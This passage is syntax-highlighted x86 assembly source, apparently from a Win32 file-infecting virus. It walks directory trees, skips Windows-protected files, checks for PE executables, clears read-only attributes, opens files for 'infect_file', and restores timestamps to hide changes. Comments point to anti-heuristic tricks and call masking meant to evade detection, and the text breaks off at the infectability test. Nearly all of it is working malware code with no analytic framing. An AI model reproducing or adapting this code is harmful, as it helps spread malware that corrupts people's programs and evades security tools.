</span><span class="sc5">hexwrd2asc</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">aam</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hexbyt2asc</span><span class="sc0">

</span><span class="sc5">hexbyt2asc</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">69h</span><span class="sc0">
        </span><span class="sc6">das</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">hexbyt2asc</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">hexwrd2asc</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">hexdwd2asc</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">create_event</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;non-recursive directory traverser</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">find_files</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">findlist</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GMEM_ZEROINIT</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGlobalAlloc</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">file_exit</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_krnapis</span><span class="sc0">

</span><span class="sc5">file_first</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc12">'*'</span><span class="sc0">                             </span><span class="sc1">;ANSI-compatible Unicode findmask</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.finddata</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">krncrcstk.kFindFirstFileW</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.findhand</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">file_prev</span><span class="sc0">

        </span><span class="sc1">;you must always step forward from where you stand</span><span class="sc0">

</span><span class="sc5">test_dirfile</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA.dwFileAttributes</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.finddata.cFileName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">test_file</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">             </span><span class="sc1">;ignore . and .. (but also .* directories under NT/2000/XP)</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">file_next</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;enter subdirectory, and allocate another list node</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">krncrcstk.kSetCurrentDirectoryW</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">file_next</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">findlist</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GMEM_FIXED</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGlobalAlloc</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">step_updir</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.findprev</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">file_first</span><span class="sc0">

</span><span class="sc5">file_exit</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">file_next</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.finddata</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.findhand</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">krncrcstk.kFindNextFileW</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_dirfile</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;close find, and free list node</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">krncrcstk.kFindClose</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">

</span><span class="sc5">file_prev</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.findprev</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGlobalFree</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">file_exit</span><span class="sc0">

</span><span class="sc5">step_updir</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;the ANSI string ".." can be used, even on Unicode platforms</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc12">'..'</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cSetCurrentDirectoryA</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">file_next</span><span class="sc0">

</span><span class="sc5">test_file</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;get full path and convert to Unicode if required (SFC requires Unicode path)</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;save original file attributes for close</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">enter</span><span class="sc0">   </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">krncrcstk.kGetFullPathNameW</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGetVersion</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jns</span><span class="sc0">     </span><span class="sc5">store_sfcapi</span><span class="sc0">

        </span><span class="sc1">;did you dream you were together and wake up alone?</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">enter</span><span class="sc0">   </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;use default translation</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;CP_ANSI</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kMultiByteToWideChar</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">

</span><span class="sc5">store_sfcapi</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;don't touch protected files</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'!bgr'</span><span class="sc0">                     </span><span class="sc1">;SfcIsFileProtected</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;fake success in case of no SFC</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">leave_sfc</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">leave_sfc</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">leave</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">restore_attr</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_fileattr</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;attribute ignored for existing files</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">krncrcstk.kCreateFileW</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">test_infect</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc0">                             </span><span class="sc1">;mask CALL</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_file</span><span class="sc0">                     </span><span class="sc1">;Super Nashwan power ;)</span><span class="sc0">

</span><span class="sc5">close_file</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;label required for delta offset</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.finddata.ftLastWriteTime</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kSetFileTime</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cCloseHandle</span><span class="sc0">

</span><span class="sc5">restore_attr</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;restore original file attributes</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_fileattr</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">file_next</span><span class="sc0">
</span><span class="sc5">find_files</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;look for MZ and PE file signatures</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">is_pehdr</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;edi -&gt; map view</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">            </span><span class="sc1">;Windows does not check 'MZ'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">pehdr_ret</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mzhdr.mzlfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;SEH protects against bad lfanew value</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc12">'EP'</span><span class="sc0">                      </span><span class="sc1">;anti-heuristic test filetype ;) and clear EAX</span><span class="sc0">

</span><span class="sc5">pehdr_ret</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;if PE file, then eax = 0, esi -&gt; COFF header, Z flag set</span><span class="sc0">
</span><span class="sc5">is_pehdr</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;reset/set read-only file attribute</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">set_fileattr</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;ebx = file attributes, esi -&gt; findlist, ebp -&gt; platform APIs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.finddata.cFileName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">krncrcstk.kSetFileAttributesW</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;edi -&gt; filename</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"14/02/02"</span><span class="sc0">                      </span><span class="sc1">;missing her on Valentine's Day</span><span class="sc0">
</span><span class="sc5">set_fileattr</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;test if file is infectable (not protected, PE, x86, non-system, not infected, etc)</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">test_infect</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;esi = find data, edi = map view, ebp -&gt; platform APIs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">map_view</span><span class="sc0">
